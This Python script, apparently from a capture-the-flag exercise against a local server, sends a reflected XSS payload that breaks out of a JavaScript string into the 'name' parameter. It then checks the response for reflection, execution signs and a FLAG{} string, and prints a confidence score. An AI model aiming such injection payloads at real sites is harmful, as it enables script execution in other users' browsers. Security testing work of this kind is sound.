import requests
import urllib.parse
import re

# Target URL
base_url = "http://127.0.0.1:33119/page"
payload = 'name=");alert(\'XSS\');//'

# URL encode the payload
encoded_payload = urllib.parse.quote(payload)
full_url = f"{base_url}?name={encoded_payload}"

print(f"[+] Testing XSS payload: {payload}")
print(f"[+] Encoded payload: {encoded_payload}")
print(f"[+] Full URL: {full_url}")
print("-" * 60)

# Send GET request
try:
    response = requests.get(full_url, timeout=10)
    
    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Response Length: {len(response.text)} bytes")
    print("-" * 60)
    
    # Print response content
    print("[+] Response Content:")
    print(response.text)
    print("-" * 60)
    
    # Analyze for XSS reflection
    print("[+] Analysis:")
    
    # Check if payload appears in response (reflected)
    if payload in response.text:
        print("[!] Payload reflected in response!")
        
        # Check if it's in a JavaScript context
        script_patterns = [
            r'<script[^>]*>.*?</script>',
            r'on\w+="[^"]*"',
            r'javascript:',
            r'var\s+\w+\s*=\s*"[^"]*"'
        ]
        
        in_js_context = False
        js_context_evidence = None
        for pattern in script_patterns:
            matches = re.findall(pattern, response.text, re.DOTALL | re.IGNORECASE)
            for match in matches:
                if payload in match or 'alert(' in match:
                    in_js_context = True
                    js_context_evidence = match[:300]
                    break
            if in_js_context:
                break
        
        if in_js_context:
            print(f"[!] Payload found in JavaScript context:")
            print(f"    {js_context_evidence}...")
        else:
            print("[-] Payload reflected but not in JavaScript context (likely HTML-encoded)")
    else:
        print("[-] Payload not reflected in response")
    
    # Look for evidence of successful XSS execution
    print("\n[+] Searching for FLAG{} pattern...")
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flag_matches:
        print(f"[!] FLAG FOUND: {flag_matches[0]}")
        confidence = 0.9
    else:
        print("[-] No FLAG pattern found")
        confidence = 0.3
    
    # Check for potential XSS execution indicators
    print("\n[+] Checking for XSS execution indicators...")
    
    # If alert('XSS') appears without HTML encoding
    if "alert('XSS')" in response.text:
        # Check if it's properly encoded
        if "alert(&#39;XSS&#39;)" in response.text or "alert(&apos;XSS&apos;)" in response.text:
            print("[-] alert('XSS') appears but is HTML-encoded (XSS likely blocked)")
            confidence = max(0.3, confidence)
        elif "<script>alert('XSS')</script>" in response.text:
            print("[!] Unencoded alert('XSS') found in script tags (XSS likely successful)")
            confidence = max(0.7, confidence)
        else:
            print("[!] Unencoded alert('XSS') found (potential XSS execution)")
            confidence = max(0.6, confidence)
    
    # Adjust confidence based on reflection context
    if payload in response.text and in_js_context:
        confidence = max(0.6, confidence)
    elif payload in response.text and not in_js_context:
        confidence = max(0.4, confidence)
    elif payload not in response.text:
        confidence = max(0.2, confidence)
    
    print(f"\n[+] Confidence Score: {confidence}")
    
    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY:")
    if flag_matches:
        print("✓ XSS payload executed successfully and FLAG captured!")
        print(f"✓ Flag: {flag_matches[0]}")
    elif payload in response.text and in_js_context:
        print("? Payload reflected in JavaScript context but no flag found")
        print("  - XSS may be working but flag might be elsewhere")
    elif payload in response.text:
        print("? Payload reflected but not in executable context")
        print("  - May need different payload or injection point")
    else:
        print("✗ Payload not reflected - XSS likely blocked")
    print("=" * 60)
    
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")
    confidence = 0.0
    print(f"\n[+] Confidence Score: {confidence}")
